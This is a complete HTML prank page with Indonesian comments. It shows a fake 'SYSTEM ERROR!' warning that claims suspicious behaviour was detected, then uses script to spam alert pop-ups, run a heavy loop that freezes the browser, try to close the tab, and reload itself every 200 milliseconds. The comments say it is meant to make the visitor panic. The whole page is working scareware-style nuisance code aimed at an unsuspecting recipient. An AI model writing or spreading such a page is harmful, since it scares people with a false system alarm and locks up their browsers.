<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>❌ SYSTEM ERROR!</title>
  <style>
    body {
      background-color: black;
      color: red;
      font-family: monospace;
      text-align: center;
      padding-top: 100px;
      overflow: hidden;
    }

    h1 {
      font-size: 48px;
      animation: glitch 0.2s infinite;
    }

    p {
      font-size: 18px;
    }

    @keyframes glitch {
      0% { transform: translate(1px, -1px); }
      25% { transform: translate(-2px, 2px); }
      50% { transform: translate(2px, -2px); }
      75% { transform: translate(-1px, 1px); }
      100% { transform: translate(0, 0); }
    }
  </style>
</head>
<body>
  <h1>❌ SYSTEM ERROR!</h1>
  <p>System has detected suspicious behavior.<br>Attempting to shut down...</p>

  <script>
    // Spam alert (panik)
    let alertCount = 0;
    function spamAlert() {
      alertCount++;
      alert("⚠️ ERROR: Critical System Failure Detected!");
      if (alertCount < 10) setTimeout(spamAlert, 300);
    }

    // Lag browser (loop berat)
    function heavyLag() {
      for (let i = 0; i < 1e8; i++) {
        Math.sqrt(i) * Math.random();
      }
    }

    // Mulai prank
    setTimeout(() => {
      spamAlert();
      heavyLag();

      // Coba tutup tab (ga semua bisa)
      try { window.open('', '_self').close(); } catch (e) {}

      // Redirect cepat (biar tambah panik)
      setInterval(() => {
        location.reload();
      }, 200);
    }, 1500);
  </script>
</body>
</html>
